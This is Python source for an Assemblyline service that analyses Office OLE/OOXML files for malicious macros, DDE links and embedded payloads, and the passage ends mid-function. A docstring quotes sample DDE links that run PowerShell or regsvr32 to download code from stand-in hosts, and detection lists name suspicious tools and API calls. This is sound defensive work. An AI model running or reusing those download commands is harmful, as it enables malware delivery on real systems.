"""Oletools.

Assemblyline service using the oletools library to analyze OLE and OOXML files.
"""

from __future__ import annotations

import binascii
import email
import gzip
import hashlib
import json
import logging
import os
import re
import socket
import struct
import zipfile
import zlib
from collections import defaultdict
from datetime import datetime
from io import BytesIO
from ipaddress import AddressValueError, IPv4Address
from itertools import chain, groupby
from pathlib import PureWindowsPath
from typing import IO, TYPE_CHECKING, Any, ClassVar, Literal
from urllib.parse import unquote, urlsplit

import magic
import olefile
from assemblyline.common.forge import get_identify, get_tag_safelist_data
from assemblyline.common.iprange import is_ip_reserved
from assemblyline.common.net import is_valid_domain, is_valid_ip
from assemblyline.common.str_utils import safe_str
from assemblyline_service_utilities.common.balbuzard.patterns import PatternMatch
from assemblyline_service_utilities.common.extractor.base64 import find_base64
from assemblyline_service_utilities.common.extractor.pe_file import find_pe_files
from assemblyline_service_utilities.common.malformed_zip import zip_span
from assemblyline_v4_service.common.api import ServiceAPIError
from assemblyline_v4_service.common.base import ServiceBase
from assemblyline_v4_service.common.result import BODY_FORMAT, Heuristic, Result, ResultKeyValueSection, ResultSection
from assemblyline_v4_service.common.task import MaxExtractedExceeded
from lxml import etree
from signify.authenticode import RawCertificateFile

from oletools import mraptor, msodde, oleid, oleobj, olevba, rtfobj
from oletools.common import clsid
from oletools.thirdparty.xxxswf import xxxswf
from oletools_.cleaver import OLEDeepParser
from oletools_.signatures import describe_signed_data
from oletools_.stream_parser import PowerPointDoc

if TYPE_CHECKING:
    from collections.abc import Iterable, Mapping

    from assemblyline_v4_service.common.request import ServiceRequest

# Type definition for tags
Tags = dict[str, list[str]]

AUTO_EXEC = set(chain(*(x for x in olevba.AUTOEXEC_KEYWORDS.values())))


def collate_tags(tags_list: Iterable[Tags]) -> Tags:
    collated: defaultdict[str, set[str]] = defaultdict(set)
    for tags in tags_list:
        for _type, values in tags.items():
            collated[_type].update(values)
    return {_type: list(tag_set) for _type, tag_set in collated.items()}


def tag_contains_match(tag: str, matches: list[str]) -> bool:
    """Check if the tag contains any of the matches."""
    return any(match.lower() == tag.lower() for match in matches)


def regex_matches_tag(tag: str, regexes: list[str]) -> bool:
    """Check if any of the regexes match the tag."""
    return any(re.match(regex, tag, re.IGNORECASE) for regex in regexes)


def is_safelisted(
    tag_type: str, tag: str, safelist_matches: Mapping[str, list[str]], safelist_regexes: Mapping[str, list[str]]
) -> bool:
    """Check if the tag is safelisted by either a match or a regex."""
    return tag_contains_match(tag, safelist_matches.get(tag_type, [])) or regex_matches_tag(
        tag, safelist_regexes.get(tag_type, [])
    )


class Oletools(ServiceBase):
    """Oletools service. See README for details."""

    # OLEtools minimum version supported
    SUPPORTED_VERSION = "0.54.2"

    MAX_STRINGDUMP_CHARS = 500
    MAX_BASE64_CHARS = 8_000_000
    MAX_XML_SCAN_CHARS = 500_000
    MIN_MACRO_SECTION_SCORE = 50
    LARGE_MALFORMED_BYTES = 5000

    METADATA_TO_TAG: ClassVar[dict[str, str]] = {
        "title": "file.ole.summary.title",
        "subject": "file.ole.summary.subject",
        "author": "file.ole.summary.author",
        "comments": "file.ole.summary.comment",
        "last_saved_by": "file.ole.summary.last_saved_by",
        "last_printed": "file.ole.summary.last_printed",
        "create_time": "file.ole.summary.create_time",
        "last_saved_time": "file.ole.summary.last_saved_time",
        "manager": "file.ole.summary.manager",
        "company": "file.ole.summary.company",
        "codepage": "file.ole.summary.codepage",
    }

    # In addition to those from olevba.py
    ADDITIONAL_SUSPICIOUS_KEYWORDS = ("WinHttp", "WinHttpRequest", "WinInet", 'Lib "kernel32" Alias')

    # Suspicious keywords for dde links
    DDE_SUS_KEYWORDS = (
        "powershell.exe",
        "cmd.exe",
        "webclient",
        "downloadstring",
        "mshta.exe",
        "scrobj.dll",
        "bitstransfer",
        "cscript.exe",
        "wscript.exe",
    )
    # Extensions of interesting files
    FILES_OF_INTEREST = frozenset(
        (
            b".APK",
            b".APP",
            b".BAT",
            b".BIN",
            b".CLASS",
            b".CMD",
            b".DAT",
            b".DLL",
            b".EPS",
            b".EXE",
            b".JAR",
            b".JS",
            b".JSE",
            b".LNK",
            b".MSI",
            b".OSX",
            b".PAF",
            b".PS1",
            b".RAR",
            b".SCR",
            b".SCT",
            b".SWF",
            b".SYS",
            b".TMP",
            b".VBE",
            b".VBS",
            b".WSF",
            b".WSH",
            b".ZIP",
        )
    )
    EXECUTABLE_EXTENSIONS = frozenset(
        (
            b".bat",
            b".class",
            b".cmd",
            b".com",
            b".cpl",
            b".dll",
            b".exe",
            b".gadget",
            b".hta",
            b".inf",
            b".jar",
            b".js",
            b".jse",
            b".lnk",
            b".msc",
            b".msi",
            b".msp",
            b".pif",
            b".ps1",
            b".ps1xml",
            b".ps2",
            b".ps2xml",
            b".psc1",
            b".psc2",
            b".reg",
            b".scf",
            b".scr",
            b".sct",
            b".vb",
            b".vbe",
            b".vbs",
            b".ws",
            b".wsc",
            b".wsf",
            b".wsh",
        )
    )

    # Don't reward use of common keywords
    MACRO_SKIP_WORDS = frozenset(
        (
            "var",
            "unescape",
            "exec",
            "for",
            "while",
            "array",
            "object",
            "length",
            "len",
            "substr",
            "substring",
            "new",
            "unicode",
            "name",
            "base",
            "dim",
            "set",
            "public",
            "end",
            "getobject",
            "createobject",
            "content",
            "regexp",
            "date",
            "false",
            "true",
            "break",
            "continue",
            "ubound",
            "none",
            "undefined",
            "activexobject",
            "document",
            "attribute",
            "shell",
            "thisdocument",
            "rem",
            "string",
            "byte",
            "integer",
            "int",
            "function",
            "text",
            "next",
            "private",
            "click",
            "change",
            "createtextfile",
            "savetofile",
            "responsebody",
            "opentextfile",
            "resume",
            "open",
            "environment",
            "write",
            "close",
            "error",
            "else",
            "number",
            "chr",
            "sub",
            "loop",
        )
    )
    # Safelists
    TAG_SAFELIST: ClassVar[list[str]] = ["management", "manager", "microsoft.com"]
    # substrings of URIs to ignore
    URI_SAFELIST: ClassVar[list[str]] = [
        "http://purl.org/",
        "http://xml.org/",
        ".openxmlformats.org",
        ".oasis-open.org",
        ".xmlsoap.org",
        ".microsoft.com",
        ".w3.org",
        ".gc.ca",
        ".mil.ca",
        "dublincore.org",
    ]
    # substrings at end of IoC to ignore
    PAT_ENDS = (b"themeManager.xml", b"MSO.DLL", b"stdole2.tlb", b"vbaProject.bin", b"VBE6.DLL", b"VBE7.DLL")
    # Common blacklist false positives
    BLACKLIST_IGNORE = frozenset(
        (b"connect", b"protect", b"background", b"enterprise", b"account", b"waiting", b"request")
    )

    # Bytes Regex's
    IP_RE = rb"^((?:(?:25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])[.]){3}(?:25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9]))"
    EXTERNAL_LINK_RE = (
        rb'(?s)[Tt]ype="[^"]{1,512}/([^"/]+)"[^>]{1,512}[Tt]arget="((?!file)[^"]+)"[^>]{1,512}'
        rb'[Tt]argetMode="External"'
    )
    JAVASCRIPT_RE = rb'(?s)script.{1,512}("JScript"|javascript)'
    EXCEL_BIN_RE = rb"(sheet|printerSettings|queryTable|binaryIndex|table)\d{1,12}\.bin"
    VBS_HEX_RE = rb"(?:&H[A-Fa-f0-9]{2}&H[A-Fa-f0-9]{2}){32,}"
    SUSPICIOUS_STRINGS = (
        # This is based on really old unmaintained stuff and should be replaced
        # In maldoc.yara from decalage2/oledump-contrib/blob/master/
        (
            rb"(CloseHandle|CreateFile|GetProcAddr|GetSystemDirectory|GetTempPath|GetWindowsDirectory|IsBadReadPtr"
            rb"|IsBadWritePtr|LoadLibrary|ReadFile|SetFilePointer|ShellExecute|URLDownloadToFile|VirtualAlloc|WinExec"
            rb"|WriteFile)",
            b"use of suspicious system function",
        ),
        # EXE
        (rb"This program cannot be run in DOS mode", b"embedded executable"),
        (rb"(?s)MZ.{32,1024}PE\000\000", b"embedded executable"),
        # Javascript
        (
            rb"(function\(|\beval[ \t]*\(|new[ \t]+ActiveXObject\(|xfa\.((resolve|create)Node|datasets|form)"
            rb"|\.oneOfChild)",
            b"embedded javascript",
        ),
        # Inspired by https://github.com/CYB3RMX/Qu1cksc0pe/blob/master/Systems/Multiple/malicious_rtf_codes.json
        (rb"(unescape\(|document\.write)", b"embedded javascript"),
        # Malicious RTF codes
        # Inspired by https://github.com/CYB3RMX/Qu1cksc0pe/blob/master/Systems/Multiple/malicious_rtf_codes.json
        (
            rb"(%28%22%45%6E%61%62%6C%65%20%65%64%69%74%69%6E%67%22%29|Enable editing|\\objhtml|\\objdata|\\bin"
            rb"|\\objautlink|No\: 20724414|%4E%6F%3A%20%32%30%37%32%34%34%31%34|passwordhash)",
            b"suspicious rtf code",
        ),
    )

    # String Regex's
    CVE_RE = r"CVE-[0-9]{4}-[0-9]*"
    MACRO_WORDS_RE = r"[a-z]{3,}"
    CHR_ADD_RE = r"chr[$]?\((\d+) \+ (\d+)\)"
    CHRW_ADD_RE = r"chrw[$]?\((\d+) \+ (\d+)\)"
    CHR_SUB_RE = r"chr[$]?\((\d+) - (\d+)\)"
    CHRW_SUB_RE = r"chrw[$]?\((\d+) - (\d+)\)"
    CHR_RE = r"chr[$]?\((\d+)\)"
    CHRW_RE = r"chrw[$]?\((\d+)\)"

    def __init__(self, config: dict | None = None) -> None:
        """Create an instance of the Oletools service.

        Args:
            config: service configuration (defaults to the configuration in the service manifest).
        """
        super().__init__(config)
        self._oletools_version = (
            f"mraptor v{mraptor.__version__}, msodde v{msodde.__version__}, oleid v{oleid.__version__}, "
            f"olevba v{olevba.__version__}, oleobj v{oleobj.__version__}, rtfobj v{rtfobj.__version__}"
        )
        self._extracted_files: dict[str, str] = {}
        self.request: ServiceRequest | None = None
        self.sha = ""

        self.word_chains: dict[str, set[str]] = {}

        self.macro_score_max_size: int | None = self.config.get("macro_score_max_file_size", None)
        self.macro_score_min_alert: float = self.config.get("macro_score_min_alert", 0.6)
        self.metadata_size_to_extract: int = self.config.get("metadata_size_to_extract", 500)
        self.ioc_pattern_safelist: list[str] = self.config.get("ioc_pattern_safelist", [])
        self.ioc_exact_safelist: list[str] = [string.lower() for string in self.config.get("ioc_exact_safelist", [])]
        self.pat_safelist = self.URI_SAFELIST
        self.tag_safelist = self.TAG_SAFELIST

        self.patterns = PatternMatch()
        self.macros: list[str] = []
        self.xlm_macros: list[str] = []
        self.pcode: list[str] = []
        self.extracted_clsids: set[str] = set()
        self.vba_stomping = False
        self.identify = get_identify(use_cache=os.environ.get("PRIVILEGED", "false").lower() == "true")

        # Use default safelist for testing and backup
        safelist = get_tag_safelist_data()
        self.match_safelist: dict[str, list[str]] = safelist.get("match", {})
        self.regex_safelist: dict[str, list[str]] = safelist.get("regex", {})

    def start(self) -> None:
        """Initialize the service."""
        chain_path = os.path.join(os.path.dirname(__file__), "chains.json.gz")
        with gzip.open(chain_path) as f:
            self.word_chains = {k: set(v) for k, v in json.load(f).items()}

        try:
            safelist = self.get_api_interface().get_safelist()
            self.match_safelist = safelist.get("match", {})
            self.regex_safelist = safelist.get("regex", {})
        except ServiceAPIError as e:
            self.log.warning("Couldn't retrieve safelist from service: %s. Continuing without it..", e)

    def is_safelisted(self, tag_type: str, tag: str) -> bool:
        return (
            any(string in tag for string in self.pat_safelist)
            or tag.lower() in self.tag_safelist
            or is_safelisted(tag_type, tag, self.match_safelist, self.regex_safelist)
        )

    def get_tool_version(self) -> str:
        """Return the version of oletools used by the service."""
        return self._oletools_version

    def execute(self, request: ServiceRequest) -> None:
        """Run the service."""
        request.result = Result()
        self.request = request
        self._extracted_files = {}
        self.sha = request.sha256
        self.extracted_clsids = set()

        self.macros = []
        self.xlm_macros = []
        self.pcode = []
        self.vba_stomping = False

        if request.deep_scan:
            self.pat_safelist = self.URI_SAFELIST
            self.tag_safelist = self.TAG_SAFELIST
        else:
            self.pat_safelist = self.URI_SAFELIST + self.ioc_pattern_safelist
            self.tag_safelist = self.TAG_SAFELIST + self.ioc_exact_safelist

        file_contents = request.file_contents
        path = request.file_path
        result = request.result
        is_installer = request.task.file_type == "document/installer/windows"

        try:
            if section := self._check_for_indicators(path):
                result.add_section(section)
            if section := self._check_for_indicators(path):
                result.add_section(section)
            if section := self._check_for_dde_links(path):
                result.add_section(section)
            if request.task.file_type == "document/office/mhtml" and (section := self._rip_mhtml(file_contents)):
                result.add_section(section)
            self._extract_streams(path, result, request.deep_scan, is_installer)
            if not is_installer and (section := self._extract_rtf(file_contents)):
                result.add_section(section)
            if section := self._check_for_macros(path, request.sha256):
                result.add_section(section)
            if section := self._create_macro_sections(request.sha256):
                result.add_section(section)
            if zipfile.is_zipfile(path):
                if section := self._check_zip(path):
                    result.add_section(section)
                self._check_xml_strings(path, result, request.deep_scan)
            self._odf_with_macros(request)
        except Exception:
            self.log.exception("We have encountered a critical error for sample %s", self.sha)

        if request.deep_scan:
            # Proceed with OLE Deep extraction
            parser = OLEDeepParser(path, result, self.log, request.task)
            # noinspection PyBroadException
            try:
                parser.run()
            except Exception as e:
                self.log.exception("Error while deep parsing %s", path)
                result.add_section(ResultSection(f"Error deep parsing: {e}"))

        try:
            for file_name, description in self._extracted_files.items():
                file_path = os.path.join(self.working_directory, file_name)
                request.add_extracted(file_path, file_name, description, safelist_interface=self.api_interface)
        except MaxExtractedExceeded:
            result.add_section(
                ResultSection(
                    "Some files not extracted",
                    body=f"This file contains to many subfiles to be extracted.\n"
                    f"There are {len(self._extracted_files) - request.max_extracted} files"
                    f" over the limit of {request.max_extracted} that were not extracted.",
                )
            )
        request.set_service_context(self.get_tool_version())

    def _check_for_indicators(self, filename: str) -> ResultSection | None:
        """Find and report on indicator objects typically present in malicious files.

        Args:
            filename: Path to original OLE sample.

        Returns:
            A result section with the indicators if any were found.
        """
        # noinspection PyBroadException
        try:
            ole_id = oleid.OleID(filename)
            indicators = ole_id.check()
            section = ResultSection("OleID indicators", heuristic=Heuristic(34))

            for indicator in indicators:
                # Ignore these OleID indicators, they aren't all that useful.
                if indicator.id in (
                    "ole_format",
                    "has_suminfo",
                ):
                    continue

                # Skip negative results.
                if indicator.risk != "none":
                    # List info indicators but don't score them.
                    if indicator.risk == "info":
                        section.add_line(
                            f"{indicator.name}: {indicator.value}"
                            + (f", {indicator.description}" if indicator.description else "")
                        )
                    else:
                        assert section.heuristic
                        section.heuristic.add_signature_id(indicator.name)
                        section.add_line(f"{indicator.name} ({indicator.value}): {indicator.description}")

            if section.body:
                return section
        except Exception:
            self.log.debug("OleID analysis failed for sample %s", self.sha, exc_info=True)
        return None

    def _check_for_dde_links(self, filepath: str) -> ResultSection | None:
        """Use msodde in OLETools to report on DDE links in document.

        Args:
            filepath: Path to original sample.

        Returns:
            A section with the dde links if any are found.
        """
        # noinspection PyBroadException
        try:
            # TODO -- undetermined if other fields could be misused.. maybe do 2 passes, 1 filtered & 1 not
            links_text = msodde.process_file(filepath=filepath, field_filter_mode=msodde.FIELD_FILTER_DDE)

            # TODO -- Workaround: remove root handler(s) that was added with implicit log_helper.enable_logging() call
            logging.getLogger().handlers = []

            links_text = links_text.strip()
            if links_text:
                return self._process_dde_links(links_text)

        # Unicode and other errors common for msodde when parsing samples, do not log under warning
        except Exception:
            self.log.debug("msodde parsing for sample %s failed", self.sha, exc_info=True)
        return None

    def _process_dde_links(self, links_text: str) -> ResultSection | None:
        """Examine DDE links and report on malicious characteristics.

        Args:
            links_text: DDE link text.
            ole_section: OLE AL result.

        Returns:
            A section with dde links if any are found.
        """
        self._extract_file(links_text.encode(), ".ddelinks.original", "Original DDE Links")

        """ typical results look like this:
        DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\windows\\system32\\WindowsPowerShell
        \\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden -C $e=(new-object system.net.webclient).downloadstring
        ('http://bad.ly/Short');powershell.exe -e $e # " "Legit.docx"
        DDEAUTO c:\\Windows\\System32\\cmd.exe "/k powershell.exe -NoP -sta -NonI -W Hidden
        $e=(New-Object System.Net.WebClient).DownloadString('http://203.0.113.111/payroll.ps1');powershell
        -Command $e"
        DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\windows\\system32\\cmd.exe"
        "/c regsvr32 /u /n /s /i:\"h\"t\"t\"p://downloads.bad.com/file scrobj.dll" "For Security Reasons"
        """

        # To date haven't seen a sample with multiple links yet but it should be possible..
        dde_section = ResultSection("MSO DDE Links:", body_format=BODY_FORMAT.MEMORY_DUMP)
        dde_extracted = False
        looksbad = False

        for line in links_text.splitlines():
            if " " in line:
                (link_type, link_text) = line.strip().split(" ", 1)

                # do some cleanup here to aid visual inspection
                link_type = link_type.strip()
                link_text = link_text.strip()
                link_text = link_text.replace("\\\\", "\u005c")  # a literal backslash
                link_text = link_text.replace('\\"', '"')
                dde_section.add_line(f"Type: {link_type}")
                dde_section.add_line(f"Text: {link_text}")
                dde_section.add_line("\n\n")
                dde_extracted = True

                data = links_text.encode()
                self._extract_file(data, ".ddelinks", "Tweaked DDE Link")

                link_text_lower = link_text.lower()
                if any(x in link_text_lower for x in self.DDE_SUS_KEYWORDS):
                    looksbad = True

                dde_section.add_tag("file.ole.dde_link", link_text)
        if dde_extracted:
            dde_section.set_heuristic(16 if looksbad else 15)
            return dde_section
        return None

    def _rip_mhtml(self, data: bytes) -> ResultSection | None:
        """Parse and extract ActiveMime Document (document/office/mhtml).

        Args:
            data: MHTML data.

        Returns:
            A result section with the extracted activemime filenames if any are found.
        """
        mime_res = ResultSection("ActiveMime Document(s) in multipart/related", heuristic=Heuristic(26))
        mhtml = email.message_from_bytes(data)
        # find all the attached files:
        for part in mhtml.walk():
            content_type = part.get_content_type()
            if content_type == "application/x-mso":
                part_data = part.get_payload(decode=True)
                if len(part_data) > 0x32 and part_data[:10].lower() == "activemime":
                    try:
                        part_data = zlib.decompress(part_data[0x32:])  # Grab  the zlib-compressed data
                        part_filename = part.get_filename(failobj="")
                        self._extract_file(part_data, part_filename, "ActiveMime x-mso from multipart/related.")
                        mime_res.add_line(part_filename)
                    except Exception as e:
                        self.log.debug("Could not decompress ActiveMime part for sample %s", self.sha, exc_info=True)

        return mime_res if mime_res.body else None

    # -- Ole Streams --

    # noinspection PyBroadException
    def _extract_streams(
        self, file_name: str, result: Result, extract_all: bool = False, is_installer: bool = False
    ) -> None:
        """Extract OLE streams and reports on metadata and suspicious properties.

        Args:
            file_name: Path to original sample.
            result: Top level result for adding stream result sections.
            extract_all: Whether to extract all streams.
            is_installer: Whether the file is an installer
        """
        try:
            # Streams in the submitted ole file
            with open(file_name, "rb") as olef:
                ole_res = self._process_ole_file(self.sha, olef, extract_all, is_installer)
            if ole_res is not None:
                result.add_section(ole_res)

            if not zipfile.is_zipfile(file_name):
                return  # File is not ODF

            # Streams in ole files embedded in submitted ODF file
            subdoc_res = ResultSection("Embedded OLE files")
            with zipfile.ZipFile(file_name) as z:
                for f_name in z.namelist():
                    with z.open(f_name) as f:
                        subdoc_section = self._process_ole_file(f_name, f, extract_all, is_installer)
                        if subdoc_section:
                            subdoc_res.add_subsection(subdoc_section)
                            f.seek(0)
                            self._extract_file(f.read(), os.path.splitext(f_name)[1], f"Embedded OLE File {f_name}")

            if subdoc_res.subsections:
                if ole_res is not None:  # OLE subdocuments in theme data zip
                    subdoc_res.set_heuristic(2)
                result.add_section(subdoc_res)
        except Exception:
            self.log.warning("Error extracting streams for sample %s:", self.sha, exc_info=True)

    def _process_ole_file(
        self, name: str, ole_file: IO[bytes], extract_all: bool = False, is_installer: bool = False
    ) -> ResultSection | None:
        """Parse OLE data and report on metadata and suspicious properties.

        Args:
            name: The ole document name.
            ole_file: The path to the ole file.
            extract_all: Whether to extract all streams.
            is_installer: Whether the ole file is an installer.

        Returns:
            A result section if there are results to be reported.
        """
        if not olefile.isOleFile(ole_file):
            return None

        ole = olefile.OleFileIO(ole_file)
        if ole.direntries is None:
            return None

        streams_section = ResultSection(f"OLE Document {name}")
        if subsection := self._process_ole_metadata(ole.get_metadata()):
            streams_section.add_subsection(subsection)
        if subsection := self._process_ole_alternate_metadata(ole_file):
            streams_section.add_subsection(subsection)
        if subsection := self._process_ole_clsid(ole):
            streams_section.add_subsection(subsection)

        if ole.exists("\x05DigitalSignature"):
            sig_section = ResultSection("Digital Signature")
            with ole.openstream("\x05DigitalSignature") as sig_stream:
                signature = sig_stream.read()
                if subsection := self._process_authenticode(signature):
                    sig_section.add_subsection(subsection)
        else:
            sig_section = None

        decompress = ole.exists("\x05HwpSummaryInformation")
        decompress_macros: list[bytes] = []

        exstr_sec = (
            ResultSection("Extracted Ole streams:", body_format=BODY_FORMAT.MEMORY_DUMP) if extract_all else None
        )
        ole10_res = False
        ole10_sec = ResultSection(
            "Extracted Ole10Native streams:", body_format=BODY_FORMAT.MEMORY_DUMP, heuristic=Heuristic(29, frequency=0)
        )
        pwrpnt_res = False
        pwrpnt_sec = ResultSection("Extracted Powerpoint streams:", body_format=BODY_FORMAT.MEMORY_DUMP)
        swf_sec = ResultSection(
            "Flash objects detected in OLE stream:", body_format=BODY_FORMAT.MEMORY_DUMP, heuristic=Heuristic(5)
        )
        hex_sec = ResultSection("VB hex notation:", heuristic=Heuristic(6))
        sus_res = False
        sus_sec = ResultSection("Suspicious stream content:", heuristic=Heuristic(9, frequency=0))

        ole_dir_examined = set()
        for entry in ole.listdir():
            extract_stream = False
            stream_name = safe_str("/".join(entry))
            self.log.debug("Extracting stream %s for sample %s", stream_name, self.sha)
            with ole.openstream(entry) as stream:
                data = stream.getvalue()
                stm_sha = hashlib.sha256(data).hexdigest()
                # Only process unique content
                if stm_sha in ole_dir_examined:
                    continue
                ole_dir_examined.add(stm_sha)
                try:
                    # Find flash objects in streams
                    if b"FWS" in data or b"CWS" in data and self._extract_swf_objects(stream):
                        swf_sec.add_line(f"Flash object detected in OLE stream {stream_name}")
                except Exception:
                    self.log.exception(
                        "Error extracting flash content from stream %s for sample %s:",
                        stream_name,
                        self.sha,
                    )

            # noinspection PyBroadException
            try:
                if "Ole10Native" in stream_name and self._process_ole10native(stream_name, data, ole10_sec):
                    ole10_res = True
                    continue

                if "PowerPoint Document" in stream_name and self._process_powerpoint_stream(data, pwrpnt_sec):
                    pwrpnt_res = True
                    continue

                if decompress:
                    try:
                        data = zlib.decompress(data, -15)
                    except zlib.error:
                        pass

                # Find hex encoded chunks
                for vbshex in re.findall(self.VBS_HEX_RE, data):
                    if self._extract_vb_hex(vbshex):
                        hex_sec.add_line(f"Found large chunk of VBA hex notation in stream {stream_name}")

                # Find suspicious strings
                # Look for suspicious strings
                for pattern, desc in self.SUSPICIOUS_STRINGS:
                    matched = re.search(pattern, data, re.MULTILINE)
                    if matched and "_VBA_PROJECT" not in stream_name:
                        extract_stream = True
                        sus_res = True
                        body = (
                            f"'{safe_str(matched.group(0))}' string found in stream "
                            f"{stream_name}, indicating {safe_str(desc)}"
                        )
                        if b"javascript" in desc:
                            sus_sec.add_subsection(
                                ResultSection(
                                    "Suspicious string found: 'javascript'", body=body, heuristic=Heuristic(23)
                                )
                            )
                        elif b"executable" in desc:
                            sus_sec.add_subsection(ResultSection("Suspicious string found: 'executable'", body=body))
                            if not is_installer:  # executables are expected inside of installers
                                sus_sec.set_heuristic(24)
                        else:
                            sus_sec.add_subsection(
                                ResultSection("Suspicious string found", body=body, heuristic=Heuristic(25))
                            )

                # Finally look for other IOC patterns, will ignore SRP streams for now
                if not re.match(r"__SRP_[0-9]*", stream_name):
                    iocs, extract_stream = self._check_for_patterns(data, extract_all)
                    if iocs:
                        sus_sec.add_line(f"IOCs in {stream_name}:")
                        sus_res = True
                    for tag_type, tags in iocs.items():
                        sorted_tags = sorted(tags)
                        sus_sec.add_line(f"    Found the following {tag_type.rsplit('.', 1)[-1].upper()} string(s):")
                        sus_sec.add_line("    " + safe_str(b"  |  ".join(sorted_tags)))
                        for tag in sorted_tags:
                            sus_sec.add_tag(tag_type, tag)
                ole_b64_res = self._check_for_b64(data, stream_name)
                if ole_b64_res:
                    ole_b64_res.set_heuristic(10)
                    extract_stream = True
                    sus_res = True
                    sus_sec.add_subsection(ole_b64_res)

                # All streams are extracted with deep scan or if it is an installer
                if extract_stream or swf_sec.body or hex_sec.body or extract_all or is_installer:
                    if exstr_sec:
                        exstr_sec.add_line(f"Stream Name:{stream_name}, SHA256: {stm_sha}")
                    self._extract_file(data, ".ole_stream", f"Embedded OLE Stream {stream_name}")
                    if decompress and (stream_name.endswith((".ps", ".eps")) or stream_name.startswith("Scripts/")):
                        decompress_macros.append(data)

            except Exception:
                self.log.warning(
                    "Error adding extracted stream %s for sample %s:", stream_name, self.sha, exc_info=True
                )

        if sig_section:
            streams_section.add_subsection(sig_section)
        if exstr_sec and exstr_sec.body:
            streams_section.add_subsection(exstr_sec)
        if ole10_res:
            streams_section.add_subsection(ole10_sec)
        if pwrpnt_res:
            streams_section.add_subsection(pwrpnt_sec)
        if swf_sec.body:
            streams_section.add_subsection(swf_sec)
        if hex_sec.body:
            streams_section.add_subsection(hex_sec)
        if sus_res:
            assert sus_sec.heuristic
            sus_sec.heuristic.increment_frequency(sum(len(tags) for tags in sus_sec.tags.values()))
            streams_section.add_subsection(sus_sec)

        if decompress_macros:
            # HWP Files
            ResultSection(
                "Compressed macros found, see extracted files", heuristic=Heuristic(22), parent=streams_section
            )
            macros = b"\n".join(decompress_macros)
            self._extract_file(macros, ".macros", "Combined macros")

        return streams_section

    def _format_signer(self, signed_datas: list[dict[str, Any]]) -> tuple[dict[str, Any], dict[str, Any]]:
        # The following logic finds the signer certificate
        # by comparing the certificate's issuer with the signeddata's signer info.
        if not signed_datas:
            return {}, {}

        signer_cert = None
        certs = signed_datas[0].get("certificates", [])
        signer = signed_datas[0].get("signer", {})
        signer_issuer = signer.get("issuer", "")
        for cert in certs:
            cert_issuer = cert.get("issuer", "")
            if cert_issuer == signer_issuer:
                signer_cert = cert

        cert_info = {}
        cert = signer_cert
        cert_info = {
            "subject": [cert.get("subject", "")],
            "issuer": [cert.get("issuer", "")],
            "serial": [cert.get("serial", "")],
            "valid": {"start": [cert.get("valid_from", "")], "end": [cert.get("valid_to", "")]},
        }
        body_info = {
            "subject": [cert.get("subject", "")],
            "issuer": [cert.get("issuer", "")],
            "serial": [cert.get("serial", "")],
            "valid from": [cert.get("valid_from", "")],
            "valid to": [cert.get("valid_to", "")],
        }
        # TO DO: calculate/extract the fingerprint/thumbprints
        tags = {
            "cert": cert_info,
        }
        body_result = {
            "body": body_info,
        }
        return tags, body_result

    def _process_authenticode(self, signature: bytes) -> ResultSection | None:
        """Process Authenticode signature and extract information.

        Args:
            signature: The raw signature data.

        Returns:
            A result section with the extracted Authenticode information if any.
        """
        try:
            sig = RawCertificateFile(BytesIO(signature))
            signed_datas = [describe_signed_data(signed_data) for signed_data in sig.signed_datas]
            tags, formatted_signature = self._format_signer(signed_datas)

            sig_section = (
                ResultSection(
                    "Authenticode Signature",
                    body=json.dumps(formatted_signature["body"]),
                    body_format=BODY_FORMAT.KEY_VALUE,
                    heuristic=Heuristic(55),
                    tags=tags,
                )
                if signed_datas
                else None
            )

        except Exception:
            self.log.warning("Failed to check process authenticode signature for sample %s:", self.sha, exc_info=True)
            sig_section = None
        return sig_section

    def _process_ole_metadata(self, meta: olefile.OleMetadata) -> ResultSection | None:
        """Create sections for ole metadata.

        Args:
            meta: the ole metadata.

        Returns:
            A result section with metadata info if any metadata was found.
        """
        meta_sec = ResultKeyValueSection("OLE Metadata:")

        codepage = getattr(meta, "codepage", "latin_1")
        codec = safe_str(codepage if codepage else "latin_1", force_str=True)
        for prop in chain(meta.SUMMARY_ATTRIBS, meta.DOCSUM_ATTRIBS):
            value = getattr(meta, prop)
            if value is not None and value not in ['"', "'", ""]:
                if prop == "thumbnail":
                    self._extract_file(value, ".thumbnail.data", "OLE metadata thumbnail extracted")
                    meta_sec.set_item(prop, "[see extracted files]")
                    # Todo: is thumbnail useful as a heuristic?
                    # Doesn't score and causes error how its currently set.
                    # meta_sec.set_heuristic(18)
                    continue
                # Extract data over n bytes
                if isinstance(value, str) and len(value) > self.metadata_size_to_extract:
                    data = value.encode()
                    self._extract_file(data, f".{prop}.data", f"OLE metadata from {prop.upper()} attribute")
                    meta_sec.set_item(prop, f"[Over {self.metadata_size_to_extract} bytes, see extracted files]")
                    meta_sec.set_heuristic(17)
                    continue
                if isinstance(value, bytes):
                    try:
                        value = value.decode(codec)
                    except ValueError:
                        self.log.warning("Failed to decode %r with %s", value, codec)
                meta_sec.set_item(prop, safe_str(value, force_str=True))
                # Add Tags
                if prop in self.METADATA_TO_TAG and value:
                    if isinstance(value, datetime):
                        meta_sec.add_tag(self.METADATA_TO_TAG[prop], safe_str(value, force_str=True))
                    else:
                        meta_sec.add_tag(self.METADATA_TO_TAG[prop], safe_str(value))
        return meta_sec if meta_sec.body else None

    def _process_ole_alternate_metadata(self, ole_file: IO[bytes]) -> ResultSection | None:
        """Extract alternate OLE document metadata SttbfAssoc strings.

        https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-doc/f6f1030e-2e5e-46ff-92f0-b228c5585308

        Args:
            ole_file: OLE bytesIO to process.

        Returns:
            A result section with alternate metadata info if any metadata was found.
        """
        json_body = {}

        sttb_fassoc_start_bytes = b"\xFF\xFF\x12\x00\x00\x00"
        sttb_fassoc_lut = {
            0x01: "template",
            0x02: "title",
            0x03: "subject",
            0x04: "keywords",
            0x06: "author",
            0x07: "last_saved_by",
            0x08: "mail_merge_data_source",
            0x09: "mail_merge_header_document",
            0x11: "write_reservation_password",
        }
        _ = ole_file.seek(0)
        data = ole_file.read()
        sttb_fassoc_idx = data.find(sttb_fassoc_start_bytes)
        if sttb_fassoc_idx < 0:
            return None
        current_pos = sttb_fassoc_idx + len(sttb_fassoc_start_bytes)

